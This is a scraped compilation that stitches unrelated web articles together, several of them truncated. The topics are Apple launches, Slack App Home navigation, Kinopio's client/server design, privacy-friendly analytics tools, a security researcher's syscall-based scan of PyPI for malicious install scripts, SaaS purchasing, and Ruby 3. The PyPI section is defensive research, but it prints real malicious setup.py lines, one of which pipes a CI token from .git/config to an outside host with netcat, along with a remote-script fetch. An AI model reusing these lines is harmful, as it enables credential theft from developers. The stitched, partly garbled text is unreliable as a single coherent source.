<p>Apple’s product launches have become a fall tradition. Every year we wait for them, and wait to see not only what innovative products they are introducing, but also how they are changing the game. For tech enthusiasts and entrepreneurs alike, any big company has multiple examples of what-to-do and what-not-to-do. But Apple is in a league of its own. Whether you love the brand or think they represent everything that’s wrong with the world, Apple is a force to learn from.</p>

Slack’s App Home makes it easier than ever to create high-quality user interfaces by borrowing familiar elements from the web.</p><p>For a good experience, users need to be able to navigate smoothly throughout your app.  If they can't get to the important feature you just added without getting frustrated, it wasn’t worth building. Let’s take a look at some of the common patterns for navigation and how to apply them to Slack. These design elements reveal only a single area of content at a time, simplifying the user journey in your app. To demonstrate each style of navigation, we will start with a template provided by Slack and then modify it.

This style is good for apps that only have a small number of sections as too many buttons (tabs) can appear unwieldy. A possible workaround would be combining tabs with the next idea, modal navigation.  Limit your tabs to just the most crucial, then make a <em>'More Options'</em> tab to show all sections in a modal.  Another alternative is to use buttons for the top sections and an overflow menu for those that remain.</p><p><img src="https://happybara.io/wp-content/uploads/2020/09/app-home-nav-tabs.jpg" data-src="https://happybara.io/wp-content/uploads/2020/09/app-home-nav-tabs.jpg" alt="app home tab navigation"></p><h2>Modal Navigation</h2><p><a href="https://app.slack.com/block-kit-builder/#%7B%22title%22:%7B%22type%22:%22plain_text%22,%22text%22:%22App%20Menu%22,%22emoji%22:true%7D,%22submit%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Submit%22,%22emoji%22:true%7D,%22type%22:%22modal%22,%22close%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Cancel%22,%22emoji%22:true%7D,%22blocks%22:%5B%7B%22type%22:%22section%22,%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22%20%22%7D,%22accessory%22:%7B%22type%22:%22radio_buttons%22,%22initial_option%22:%7B%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Home%22%7D,%22value%22:%22option%201%22,%22description%22:%7B%22type%22:%22plain_text%22,%22text%22:%22%20%20%22%7D%7D,%22options%22:%5B%7B%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Home%22%7D,%22value%22:%22option%201%22,%22description%22:%7B%22type%22:%22plain_text%22,%22text%22:%22%20%20%22%7D%7D,%7B%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Approvals%22%7D,%22value%22:%22option%202%22,%22description%22:%7B%22type%22:%22plain_text%22,%22text%22:%22History%20of%20approvals%22%7D%7D,%7B%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22All%20Expenses%22%7D,%22value%22:%22all_expenses%22,%22description%22:%7B%22type%22:%22plain_text%22,%22text%22:%22View%20details%20and%20approve%20all%20expenses%22%7D%7D,%7B%22text%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Settings%22%7D,%22value%22:%22Settings%22,%22description%22:%7B%22type%22:%22plain_text%22,%22text%22:%22Change%20your%20settings%22%7D%7D%5D%7D%7D,%7B%22type%22:%22divider%22%7D,%7B%22type%22:%22section%22,%22text%22:%7B%22type%22:%22mrkdwn%22,%22text%22:%22*_Get%20in%20touch:_*%22%7D,%22fields%22:%5B%7B%22type%22:%22mrkdwn%22,%22text%22:%22_%3Chttps://happybara.io%7C:writing_hand:%20Blog%3E_%22%7D,%7B%22type%22:%22mrkdwn%22,%22text%22:%22_%3Chttps://twitter.com/happybara_io%7C:woman:%20Facebook%3E_%22%7D,%7B%22type%22:%22mrkdwn%22,%22text%22:%22_%3Chttps://happybara.io%7C:camera:%20Instagram%3E_%22%7D,%7B%22type%22:%22mrkdwn%22,%22text%22:%22_%3Chttps://twitter.com/happybara_io%7C:bird:%20Twitter%3E_%22%7D%5D,%22accessory%22:%7B%22type%22:%22image%22,%22image_url%22:%22https://s3.happybara.io/pool-bara-square.png%22,%22alt_text%22:%22plants%22%7D%7D%5D%7D">Open in Block Kit Builder</a></p><p>To approximate drawer navigation from the web, pop a modal from a button.

    <p>You’ve probably heard, or lived, a story that goes like this…</p>

<blockquote>
  <p>I’m tired of <a href="https://pketh.org/why-software-is-slow-and-shitty.html">technology</a>. I’m leaving to do something <em>real</em> like sculpt clay, work wood, herd sheep, and grow vegetables.</p>
</blockquote>

<p>But making software that runs fast, efficiently, and reliably is it’s own kind of  craft, tangible in its own way. But, to do any kind of craft you have to understand the materials of your medium, how they bend, and how to work together.</p>

<p>Making an aircraft engine requires an understanding of the tolerances and capabilities of different metals, airflow and combustion. Not that I know anything about all that – our engine is made of state, localStorage, API, and websockets.</p>

<ul>
  <li><code>kinopio-client</code> is a Vue.js app that weighs 150 KB. When you go to <a href="https://kinopio.club/">https://kinopio.club</a>, it’s downloaded and run in your browser. This is the only part of Kinopio you use if you don’t have an account.</li>
  <li><code>kinopio-server</code> is a Node.js app that runs on a server out in the world. If you’re signed in, it saves your data to a database so that you can share, collaborate, and access your spaces on other devices.</li>
</ul>

<p><img src="https://pketh.org/images/2020/architecture.png"></p>

<p><img src="https://pketh.org/images/2020/desktop-computer.gif"></p>

<ul>
  <li>Speed first, perfect later. You shouldn’t need to wait for server requests to complete before editing your spaces. Because <a href="https://craigmod.com/essays/fast_software/">fast software is the best software</a>.</li>
  <li>Favor easy maintenance. To help you sleep at night choose open technologies that are widely supported and well documented.</li>
  <li>Building a foundation for decades. This mindset encourages me to write small, simple code that is easy to re-read in the future. If I’m adding a third-party library to Kinopio, that’s now a commitment over years so I’m motivated to really know what I’m adding – and maybe write it myself instead if that’s the smaller and faster option.</li>
</ul>



<h2 id="state">State</h2>

<p><strong>State</strong> is your current space and user data, which informs the display of elements on the page. E.g. my <code>user.name = 'Pirijan'</code> and my <code>user.color = 'cyan'</code>. Kinopio uses Vue.js/Vuex to bind data to elements on the page. So when you change your <code>user.color</code>, everything that references that user’s color updates.</p>


<figure>
  <figcaption>

  </figcaption>
</figure>

<p>State is not persistent though, unless it’s saved somewhere it’ll be lost the next time you refresh.</p>

<h2 id="localstorage">LocalStorage</h2>

<p><strong>LocalStorage</strong> is 2-5 MBs of key-value data that every website gets to save on your device. Unlike cookies, localStorage data can only be accessed by the URL that created it which means it’s secure and can’t be used for user tracking and other shady shit.</p>

<p>Here’s a secret, by stringifying JSON objects you can save any kind of data structure to it. LocalStorage is fragile though, you can accidentally wipe it out by clearing your browser cache.</p>

<h2 id="api-and-database">API and Database</h2>

<p>The Kinopio <strong>API</strong> is used to <code>GET</code> and <code>POST</code>(save) data to the database so that you can edit your spaces on other devices. Getting data from servers is much slower than getting data from your localStorage, because of the round-trip and because every request needs to be privacy authorized.</p>

<p><img src="https://pketh.org/images/2020/api-docs.png"></p>
<figure>
  <figcaption>
<a href="https://help.kinopio.club/api">Kinopio API Docs</a> are  also public so that developers can make custom integrations and tools
  </figcaption>
</figure>

<h2 id="websockets">Websockets</h2>

<p><strong>Websockets</strong> create that magical collaboration feeling by enabling a real-time stream of messages to be sent and received by a client, e.g. <code>Pirijan moved cardId ABC123 to position {x: 100, y: 200}</code>. These messages are relayed by the server to collaborators whose space state is updated. e.g. updating the position of the card.</p>

<p>Websocket connections must be actively kept alive with a ‘heartbeat’ exchange. If you go afk for a while, like to make a coffee or something, reconnecting to the stream takes a couple seconds.</p>

</table>

<p>When you load Kinopio for the first time, your state is created and saved to localStorage so it can be restored. When you update your state by editing cards or connections, localStorage is also updated. Once you sign up, updates also save to the API.</p>

<p>Once you start using Kinopio on other devices, the localStorage on your phone might be ahead of the one on your computer.</p>

<p>To be fast, Kinopio first restores state from possibly outdated localStorage. Once the latest server data is downloaded, the state is re-restored.</p>

<p>While the space is downloading from the server, edits you make are saved and then applied on top of the server copy.</p>

<figure>

  Edits you make to your space while the server data is downloading are recorded and applied to it

</figure>

<p>Websockets only stream relayed updates to connected collaborators and spectators. You might be wondering, why don’t you just update the database with websockets instead of relatively slow API requests?</p>

<p>The problem with saving data with websockets is that they’re <em>too</em> fast. Authenticating that many messages per second and writing them to disk would be really inefficient. E.g. If you’re moving a card from position <code>x: 20</code> to <code>x: 420</code>, Kinopio will use websockets to broadcast many updates during the move: <code>moving card x to 21</code>, <code>moving card x to 24</code>, <code>moving card x to 28</code>… potentially hundreds of messages. Or you could send a single API request after you’ve moved the card, <code>PATCH card.x = 420</code>.</p>

<p><img src="https://pketh.org/images/2020/cappuccino.png"></p>

<p>Building fast, easy to maintain software that’ll hopefully last for decades means understanding and using the right technology for the right job. It’s its own kind of craft, in its own kind of way.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I tried out many analytics SaaS on my blog to find a great alternative for my tracking needs. I was using Google Analytics before, but now I want to use something that cares about my and other user's privacy.</p><p>My feature requests are very simple:</p><ul><li>tracks page views without using cookies</li><li>privacy-focused</li><li>can track events</li><li>offers a way to use a custom domain to deny ad blockers</li><li>(optional) possibility to share the dashboard via a link</li></ul><p>Most alternatives I found offer (most of) those features and even more. Before going over each alternative, I want to talk about why you might want to get rid of Google Analytics.</p><h2>Why you should not use Google Analytics</h2><p><strong>Privacy.</strong> Google Analytics is a free service from Google. When something is free, you probably will be paying with something else. In Google's case, you will be paying with the data that you collect for them. Google is a big ad company that generates money by using your data. So this is one big reason not to use Google Analytics. I try to reduce my services that depend on Google and I always look for alternatives. <a target="_blank" rel="noopener noreferrer" href="https://twitter.com/levelsio">Pieter Levels</a> created a website where you can find alternatives for Google services called <a target="_blank" rel="noopener noreferrer" href="https://nomoregoogle.com/">No More Google</a>.</p><p><strong>Cookies.</strong> Another reason why you might not want to use Google Analytics is that you will have to show those ugly cookie banners. If you are using services that put cookies on your site you will have to show those cookie banners to stay GDPR compliant. You will also have to put in place the option to opt-out of it and have a policy page. It's not that difficult to implement, but you could skip it.</p><p><strong>Complex Dashboard.</strong> Google Analytics is way more than just tracking pageviews, therefore it has lots of features and the dashboard is not that easy to use. If you only want to track page views and maybe some events then I think Google Analytics is overkill for your use case.</p><p><strong>Ad-Blockers.</strong> If you use Google Analytics you will not track all page views, because of the well-known domain name that it is blocked by most ad blockers. With other services, you can use a custom domain that is not blocked by ad blockers and you will get way more analytics data.</p><hr><p>In the next sections, I want to give you an overview of 6 different analytics services that I can recommend without blinking an eye. Some of them are free to use and open-source, others will require a subscription.</p><h2>Plausible Analytics</h2><p><a target="_blank" rel="noopener noreferrer" href="https://plausible.io/">https://plausible.io/</a></p><blockquote><p>Simple and privacy-friendly alternative to Google Analytics</p></blockquote><p>Plausible Analytics is one of my favorite Analytics services I have used.</p><p>The UI is very modern and clean, it is privacy-friendly, can track multiple websites in one account, you can <a target="_blank" rel="noopener noreferrer" href="https://docs.plausible.io/self-hosting/">self-host</a> it because it is <a target="_blank" rel="noopener noreferrer" href="https://github.com/plausible/analytics">open source</a>, it allows the use of custom domains, sends you weekly or monthly reports and much more.</p><p><img src="https://images.ctfassets.net/hb3id6ag4raq/tClWlK2Wk8YxnZzelQq3l/dad4d975b556a1702daa15e0c7ff0c82/Screenshot_2020-11-04_at_21.10.14.png" alt="Plausible Analytics 7-days"></p><p>It ticks almost every checkbox of the features I need and if it is not currently implemented it will be soon. Plausible Analytics is working on more features and they have a <a target="_blank" rel="noopener noreferrer" href="https://github.com/plausible/analytics/projects/1">public roadmap</a> where you can see what will be added next!</p><p>I like to host services myself therefore I love that Plausible is open source and that I can host it myself. Of course, with self-hosting, I need to take care that the server is always online and the database is backed up regularly.</p><p>If I don't want to do that, I can let Plausible take care of it for a very fair price depending on the amount of traffic you have. They even offer a free trial of 30 days without requiring a credit card.</p><h2>Fathom</h2><p><a target="_blank" rel="noopener noreferrer" href="https://usefathom.com/ref/SAJGHU">https://usefathom.com/</a> (affiliate link)</p><blockquote><p>Your website analytics should be simple, fast and privacy-focused</p></blockquote><p>Fathom is one of the first analytics SaaS that focused on privacy.</p><p>It offers a clean and easy to use dashboard with only the information that you will need. You can use your Fathom account for multiple websites, the pricing is fair, you can use custom domains and you can track events by creating goals.</p><p><img src="https://images.ctfassets.net/hb3id6ag4raq/7EEZoLbMU6NmsGnoJvykT8/81839ba5790494c6a95a1c5d4cd7d056/Screenshot_2020-11-04_at_21.08.19.png" alt="Fathom 7-days"></p><p>They are currently working on new branding and <a target="_blank" rel="noopener noreferrer" href="https://twitter.com/usefathom/status/1319310149647937536">as it looks like</a> a new dashboard with additional features like API access.</p><p>Additional to analytics Fathom also provides website monitoring. You can get notified if your website ever goes offline and that is included with your account for FREE!</p><p>Recently Fathom published the <a target="_blank" rel="noopener noreferrer" href="https://usephantom.com/">Phantom Analyzer</a>. A simple tool where you can check if a site is using some shady trackers or if your site is trackers free.</p><p><img src="https://images.ctfassets.net/hb3id6ag4raq/1bE9MaSnfSxFWH7iuJYcj2/73d40052d493ad36b741bb10b059de96/Screenshot_2020-11-04_at_21.48.43.png" alt="Phantom Analyzer"></p><p>If you care about privacy then I would suggest that you check out Fathom. They offer 7 days free trial and if you decide to delete your account, they make sure that your data is gone for good!</p><h2>Umami</h2><p><a target="_blank" rel="noopener noreferrer" href="https://umami.is/">https://umami.is/</a></p><blockquote><p>own your website analytics</p></blockquote><p>Umami is an open-source alternative to Google Analytics developed by <a target="_blank" rel="noopener noreferrer" href="https://twitter.com/caozilla">Mike Cao</a> that you can host yourself.</p><p>Umami offers simple page and event tracking with a beautiful minimalistic UI. You can add as many websites as you like. Create a shareable link for the analytics and see real-time visitors.</p><p><img src="https://images.ctfassets.net/hb3id6ag4raq/6m0v9HixM56yBOeWhgSP9P/5eef4d612538564bc4e7bf7ccd7288ae/Screenshot_2020-11-04_at_21.10.39.png" alt="Umami 7-days"></p><p>I like how simple and clean the dashboard from Umami is.  New features and improvements are added regularly. Hosting is very easy too and documented well!</p><p>Hosting the analytics service yourself will allow you full control of the data that is tracked of your visitors. As I already said if tracking data is critical for you, you should probably invest some time into setting up some backup strategies. Therefore Umami is "free", but you will have to pay with your own time and stress I guess 😅</p><h2>Simple Analytics</h2><p><a target="_blank" rel="noopener noreferrer" href="https://referral.simpleanalytics.com/phiilu">https://simpleanalytics.com/</a> (affiliate link)</p><blockquote><p>Simple, clean, and friendly analytics</p></blockquote><p>I found Simple Analytics via Twitter and thought I might check it out too.</p><p>Simple Analytics offers privacy-friendly analytics that won't sell your data. It has a strong focus on being privacy-friendly and <a target="_blank" rel="noopener noreferrer" href="https://docs.simpleanalytics.com/what-we-collect?ref=simpleanalytics.com">transparent</a> with what it will track and store.

<p><img src="https://jordan-wright.com/blog/images/headers/svg/ossmalware.svg" alt="">
<br>
About a year ago, the Python Software Foundation <a href="https://discuss.python.org/t/what-methods-should-we-implement-to-detect-malicious-content/2240">opened a Request for Information (RFI)</a> to discuss how we could detect malicious packages being uploaded to PyPI. Whether it’s <a href="https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm">taking over abandoned packages</a>, <a href="https://github.com/dateutil/dateutil/issues/984">typosquatting on popular libraries</a>, or <a href="https://github.com/ChALkeR/notes/blob/master/Gathering-weak-npm-credentials.md">hijacking packages using credential stuffing</a>, it’s clear this is a real issue affecting nearly every package manager.</p>

<p>The truth is that package managers like PyPI are critical infrastructure that almost every company relies on. I could write for days on this topic, but I’ll just let this xkcd suffice for now.</p>
<p><a href="https://xkcd.com/2347/"><img src="https://imgs.xkcd.com/comics/dependency.png" alt="">
</a></p>
<p>This is an area of interest for me, so I responded with <a href="https://gist.github.com/jordan-wright/dfe6236cb4d084aba282239fa9679bc8">my thoughts</a> on how we could approach this. While the entire post is well-cited, beautiful prose that you should go read, one thing stuck with me: considering what happens as soon as a package is installed.</p>
<p>While it might be necessary for some setup activities, things like establishing network connections or executing commands during the <code>pip install</code> process should always be viewed with a 🤨, since it doesn’t give the developer much of a chance to inspect the code before bad things happen.</p>
<p>I wanted to explore this further, so in this post I’m going to walk through how I installed and analyzed every package in PyPI looking for malicious activity.</p>
<h2 id="how-to-find-malicious-libraries">How to Find Malicious Libraries</h2>
<p>To run arbitrary commands during installation, authors typically add code to the <code>setup.py</code> file in their package. You can see some examples in <a href="https://github.com/rsc-dev/pypi_malware/tree/master/malware">this repository</a>.</p>
<p>At a high-level, there are two things you can do to find potentially malicious dependencies: you can look through the code for bad things (static analysis), or you can live dangerously and just install them to see what happens (dynamic analysis).</p>
<p>While static analysis is super interesting (heck, I <a href="https://duo.com/decipher/hunting-malicious-npm-packages">found malicious packages on npm</a> using artisanal <code>grep</code>ing), for this post I’ll focus on dynamic analysis. After all, I think it’s a bit more robust since you’re looking at what <em>actually</em> happens instead of just looking for bad things that could happen.</p>
<p>So what is it we’re actually looking for?</p>
<h3 id="how-important-things-get-done">How Important Things Get Done</h3>
<p>Generally, anytime something important happens it’s done by the kernel. Normal programs (like <code>pip</code>) that want to do important things through the kernel do so through the use of <em>syscalls</em>. Opening files, establishing network connections, and executing commands are all done using syscalls!</p>
<p>You can find more information in this comic from <a href="https://twitter.com/b0rk">Julia Evans</a>:</p>
<blockquote><p lang="en" dir="ltr">system calls <a href="https://t.co/hL91dqbFyq">pic.twitter.com/hL91dqbFyq</a></p>— 🔎Julia Evans🔍 (@b0rk) <a href="https://twitter.com/b0rk/status/989011990092963840?ref_src=twsrc%5Etfw">April 25, 2018</a></blockquote>

<p>This means that if we can watch syscalls during the installation of a Python package, we can see if anything suspicious occurs. The benefit is that it doesn’t matter how obfuscated the code is- we’ll see what actually happens.</p>
<p>It’s important to note that the idea of watching syscalls isn’t something I came up with. Folks like <a href="https://twitter.com/adam_baldwin">Adam Baldwin</a> have been talking about this <a href="https://www.slideshare.net/evilpacket/hunting-for-malicious-modules-in-npm-nodesummit">since 2017</a>. And there was an <a href="https://arxiv.org/pdf/2002.01139.pdf">excellent paper</a> published by researchers from the Georgia Institute of Technology that took this same approach, among others. Honestly, most of this blog post is just trying to reproduce their work.</p>
<p>So we know we want to monitor syscalls - how exactly do we do that?</p>
<h3 id="watching-syscalls-with-sysdig">Watching Syscalls with Sysdig</h3>
<p>There are a number of tools designed to let you watch syscalls. For this project I used <a href="https://github.com/draios/sysdig">sysdig</a> since it provides both structured output and some really nice filtering capabilities.</p>
<p>To make this work, when starting the Docker container that installs the package, I also started a sysdig process that only monitors events from that container. I also filtered out network reads/writes that are going to/from <code>pypi.org</code> or <code>files.pythonhosted.com</code> since I didn’t want to fill the logs with traffic related to package downloads.</p>
<p>With a way to capture syscalls, I had to solve another problem: how to get a list of all PyPI packages.</p>
<h2 id="getting-python-packages">Getting Python Packages</h2>
<p>Fortunately for us, PyPI has an API called the <a href="https://www.python.org/dev/peps/pep-0503/">“Simple API”</a> that can also be thought of as “a very big HTML page with a link to every package” since that’s what it is. It’s simple, clean, and better than any HTML I can probably write.</p>
<p>We can grab this page and parse out all the links using <code>pup</code>, giving us right around 268,000 packages:</p>
<div><pre><code data-lang="text">❯ curl https://pypi.org/simple/ | pup 'a text{}' &gt; pypi_full.txt               

❯ wc -l pypi_full.txt 
  268038 pypi_full.txt</code></pre></div>
<p>For this experiment, I’ll only care about the latest release of each package. It’s possible that there’s malicious versions of packages buried in older releases, but the AWS bill isn’t going to pay itself.</p>
<p>I ended up with a pipeline that looked something like this:</p>

<p>In a nutshell, we’re sending each package name to a set of EC2 instances (I’d love to use Fargate or something in the future but I also don’t know Fargate, so…) which fetches some metadata about the package from PyPI, then starts sysdig as well as a series of containers to <code>pip install</code> the package while syscalls and network traffic were being collected. Then, all of the data is shipped up to S3 for future-Jordan to worry about.</p>
<p>Here’s what this process looks like:</p>

<h2 id="the-results">The Results</h2>
<p>Once this was complete, I had about a terabyte of data sitting in an S3 bucket covering around 245,000 packages. A few packages didn’t have a published version, and some had various processing errors but this felt like a great sample set to work from.</p>
<p>Now for the fun part: <strike>a crapton of grep</strike> ✨ <strong>analysis</strong> ✨.</p>
<p>I merged the metadata and the output, giving me a series of JSON files that looked like this:</p>
<div><pre><code data-lang="json"><span>{</span>
    <span>"metadata"</span><span>:</span> <span>{},</span>
    <span>"output"</span><span>:</span> <span>{</span>
        <span>"dns"</span><span>:</span> <span>[],</span>         <span>//</span> <span>Any</span> <span>DNS</span> <span>requests</span> <span>made</span>
        <span>"files"</span><span>:</span> <span>[],</span>       <span>//</span> <span>All</span> <span>file</span> <span>access</span> <span>operations</span>
        <span>"connections"</span><span>:</span> <span>[],</span> <span>//</span> <span>TCP</span> <span>connections</span> <span>established</span>
        <span>"commands"</span><span>:</span> <span>[],</span>    <span>//</span> <span>Any</span> <span>commands</span> <span>executed</span>
    <span>}</span>
<span>}</span></code></pre></div>
<p>I then wrote a series of scripts to start aggregating the data, trying to get a sense of what’s benign and what’s malicious. Let’s dig into some of the results.</p>
<h3 id="network-requests">Network Requests</h3>
<p>There are a number of reasons why a package would need to make a network connection during the installation process. They might need to download legitimate binary components or other resources, they might be a form of analytics, or they may be trying to exfiltrate data or credentials from the system.</p>
<p>The results found 460 packages making network connections to 109 unique hosts. Just like the paper above mentions, quite a few of these are the result of packages sharing a dependency that makes the network connection. It’s possible to filter these out by mapping dependencies, but I haven’t done that here.</p>
<p>For more information, <a href="https://gist.github.com/jordan-wright/c8b273372368ee639dec46b08a93bce1">here’s</a> a breakdown of DNS requests seen during installation.</p>
<h3 id="command-execution">Command Execution</h3>
<p>Like network connections, there are legitimate reasons for packages to run system commands during installation. This could be to compile native binaries, setup the right environment, and more.</p>
<p>Looking across our sample set, 60,725 packages are found to be executing commands during installation. And just like network connections, we have to keep in mind that many of these will be the result of a downstream dependency being the package that runs the commands.</p>
<h2 id="interesting-packages">Interesting Packages</h2>
<p>Digging into the results, most network connections and commands appeared to be legitimate, as expected. But there were a few instances of odd behavior I wanted to call out as case studies to show how useful this type of analysis can be.</p>
<h3 id="i-am-malicious"><code>i-am-malicious</code></h3>
<p>One package called <code>i-am-malicious</code> appears to be a proof-of-concept of a malicious package. Here are the interesting details that give us an idea that the package is worth investigating (if the name weren’t enough 😉):</p>
<div><pre><code data-lang="json"><span>{</span>

    <span>"python /tmp/malicious.py"</span>
  <span>]</span>
<span>}</span></code></pre></div>
<p>We can already get some sense of what’s happening here. We see a connection made to <code>gist.github.com</code>, a Python file being executed, and a file named <code>/tmp/malicious-was-here</code> being created. Sure enough, that’s exactly what’s happening in the <code>setup.py</code>:</p>
<div><pre><code data-lang="python"><span>from</span> <span>urllib.request</span> <span>import</span> <span>urlopen</span>

<span>handler</span> <span>=</span> <span>urlopen</span><span>(</span><span>"https://gist.githubusercontent.com/moser/49e6c40421a9c16a114bed73c51d899d/raw/fcdff7e08f5234a726865bb3e02a3cc473cecda7/malicious.py"</span><span>)</span>

<p>The <a href="https://gist.githubusercontent.com/moser/49e6c40421a9c16a114bed73c51d899d/raw/fcdff7e08f5234a726865bb3e02a3cc473cecda7/malicious.py"><code>malicious.py</code></a> in question simply adds an “I was here” type message to <code>/tmp/malicious-was-here</code>, suggesting this is indeed a proof-of concept.</p>
<h3 id="maliciouspackage"><code>maliciouspackage</code></h3>
<p>Another self-proclaimed malicious package creatively named <code>maliciouspackage</code> is a bit more nefarious. Here’s the relevant output:</p>
<div><pre><code data-lang="json"><span>{</span>
  <span>"dns"</span><span>:</span> <span>[{</span>
      <span>"name"</span><span>:</span> <span>"laforge.xyz"</span><span>,</span>
      <span>"addresses"</span><span>:</span> <span>[</span>
        <span>"34.82.112.63"</span>
      <span>]</span>
  <span>}],</span>
  <span>"files"</span><span>:</span> <span>[</span>
    <span>{</span>
      <span>"filename"</span><span>:</span> <span>"/app/.git/config"</span><span>,</span>
      <span>"flag"</span><span>:</span> <span>"O_RDONLY"</span>
    <span>},</span>
  <span>],</span>
  <span>"commands"</span><span>:</span> <span>[</span>
    <span>"sh -c apt install -y socat"</span><span>,</span>
    <span>"sh -c grep ci-token /app/.git/config | nc laforge.xyz 5566"</span><span>,</span>
    <span>"grep ci-token /app/.git/config"</span><span>,</span>
    <span>"nc laforge.xyz 5566"</span>
  <span>]</span>
<span>}</span></code></pre></div>
<p>As before, our output gives us a decent idea of what’s going on. In this case, the package appears to extract out a token from the <code>.git/config</code> file and upload it to <code>laforge.xyz</code>. Looking through the <code>setup.py</code>, we see that’s exactly what’s happening:</p>
<div><pre><code data-lang="python"><span>...</span>
<span>import</span> <span>os</span>
<span>os</span><span>.</span><span>system</span><span>(</span><span>'apt install -y socat'</span><span>)</span>
<span>os</span><span>.</span><span>system</span><span>(</span><span>'grep ci-token /app/.git/config | nc laforge.xyz 5566'</span><span>)</span></code></pre></div>
<h3 id="easyioctl"><code>easyIoCtl</code></h3>
<p>The package <code>easyIoCtl</code> is an interesting one. It claims to give “abstractions away from boring IO operations” but we see the following commands being executed:</p>
<div><pre><code data-lang="bash"><span>[</span>
  <span>"sh -c touch /tmp/testing123"</span>,
  <span>"touch /tmp/testing123"</span>

	<h2>SaaS Needs a Single Point of Purchase</h2>
</div><div>
	<p>The unassailable advantage that big cloud providers like AWS and Azure have over the rest of the SaaS industry isn’t their quality or pace of innovation; it’s that they’re a single point of purchase for a variety of services. If there was a single vendor that large corporations could contract with and pay for SaaS, the big cloud providers market share would have hit its peak.</p>

<p>I can’t overstate the importance of purchasing mechanics in the decision of what SaaS to use inside large corporations. Because of the arcane and complex purchasing requirements you run into, the simple act of buying software is incredibly difficult and time consuming. People who’ve never worked in a BigCo often don’t realize what an unspeakable nightmare it can be. Because, you see, one does not simply put it on the credit card.</p>

<h2 id="a-series-of-unfortunate-events">A Series of Unfortunate Events</h2>

<p>I once spent <em>5 months</em> licensing Jira. We first had to get a quote, even though it’s fixed price, because Purchasing’s rules said you have to have a quote. After we got the quote, we realized we had no way to pay Atlassian because they don’t take POs and we didn’t pay any way but PO. Putting software on your corporate credit card was explicitly forbidden. So we had to engage a reseller to act as an intermediary for no other reason that they could pay with a credit card. Of course they then had to get another quote that eventually expired due to their general incompetence. Rinse and repeat for several more months until we finally got access.</p>

<p>We never licensed another SaaS product, though we had plenty of budget for it. Anything we need, we made it work on AWS tough we’d rather not have the maintenance hassle. We use open source when we’d be willing and able to license a tool simply because no one can bring themselves to relive the Jira nightmare.</p>

<h2 id="a-solution">A Solution</h2>

<p>The SaaS industry needs is a go-to biller where teams inside large corporations could license software under a standing PO. To the company, the entire SaaS industry would then look like a single vendor with many products for sale (just like AWS). Teams would no longer have to think long and hard about whether some new SaaS tool was worth putting the effort in to license, because I can tell you the answer usually ends up being ‘Buh, just make it work with AWS.’</p>

<p>I know there are already aggregators like App Sumo. However, they tend to be based more around bargains. Large companies will certainly take a deal, but it’s not a major driver for them. We paid that reseller I mentioned an extra <em>25%</em> just to use their Visa card.</p>

<p>Obviously this is a big ask. It would require a lot of major players to sign on before even launching. Maybe a non-profit SaaS consortium could make it work. What do you think? Madness or genius?</p>

November 13, 2020 | https://www.ruby3.dev/the-art-of-code/2020/11/12/ruby-3-monumental/ | <a href="https://web.archive.org/web/*/https://www.ruby3.dev/the-art-of-code/2020/11/12/ruby-3-monumental/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We’ve been living in the shadow of Ruby 2 for seven years now. Seven! <a href="https://www.ruby-lang.org/en/news/2013/02/24/ruby-2-0-0-p0-is-released/">Ruby 2 was released in 2013</a> (which incidentally is the same year as the initial public release of React 0.3.0!).</p>

<p>In that span of time, Ruby performance has improved <em>significantly</em> and many, many enhancements to the language have benefited a great many people and projects. We’ve seen companies using Ruby and in many cases Rails become bedrocks of developer and consumer internet infrastructure. GitHub. Shopify. Stripe. Square. AirBnB.</p>

<p>But there has also been some consternation along the way. Is Ruby really a top-tier programming language able to compete with the likes of Javascript, Python, PHP, Go, and beyond? Or was it just a DHH-fueled hype-cycle doomed to inevitable relative obscurity as other technologies and frameworks ascended in its wake? (I don’t actually believe anyone seriously thinks this any more, but you still see the stray head-scratcher whiz by on Hacker News.)</p>

<p>Now we are mere weeks away from a major new Ruby release: version 3. While Ruby 3 is an exciting update with lots of features that make it interesting both now and in the future with various point updates promising even more goodies, I think it’s the <strong>psychology</strong> of turning over from major version 2 to 3 that is most vital to the future health of the community.</p>

<p>Ruby 3 isn’t just a new version. <strong>It’s a new era.</strong></p>

<p>What does this era represent? Let’s list a few talking points I hope we’ll start to push <em>hard</em> and <em>often</em> as Rubyists:</p>

<h3 id="ruby-3-is-fast">Ruby 3 is Fast</h3>

<p>No, I don’t mean Ruby 3 suddenly got a whole lot faster than Ruby 2.7. I mean that Ruby 3 is <em>fast compared to Ruby 2</em>. It’s unfortunate that much of the “Ruby is slow” meme has been a laggard perspective stemming from people’s experiences <em>years ago</em> with the language, or an old version of Rails, or Jekyll, or…the fact is it just wasn’t the zippy experience we’re pleased to enjoy today.</p>

<p>Do we still want even better performance? Of course! But at this point, Ruby is plenty fast as compared to many other “scripting” languages. Most of the time it’s on par with Python. It’s even on par with Javascript. (What? Don’t believe me? <a href="https://css-tricks.com/comparing-static-site-generator-build-times/">Check out how similar Jekyll and Eleventy perform as static site generators.</a>) And as Nate Berskopec often reminds us, your Rails app can perform quite well with just a bit of fine-tuning, and often the typical bottlenecks lie elsewhere in the stack (database, web server, etc.)</p>

<h3 id="ruby-3-is-easy">Ruby 3 is Easy</h3>

<p>These days, you don’t need to wrestle with gem dependency hell or pray to the gods to get Ruby or a Ruby extension to compile. That was “old Ruby”. New Ruby is using a fancy-pants version manager like <code>rbenv</code> combined with Bundler 2.</p>

<p><strong>It just works.</strong></p>

<p>Truly, Ruby is the first thing I install on any new Mac or Linux machine I operate and getting things set up is a piece of cake. Installing Rails. Installing Bridgetown. Installing…whatever. It. Just. Works.</p>

<p>We also have things like Docker and WSL to make things <em>much</em> easier to accomplish on Windows machines if you get stuck wrestling with Win-native Ruby. Heck, you can upload your entire dev environment into the cloud now and use VSCode with remote extensions.</p>

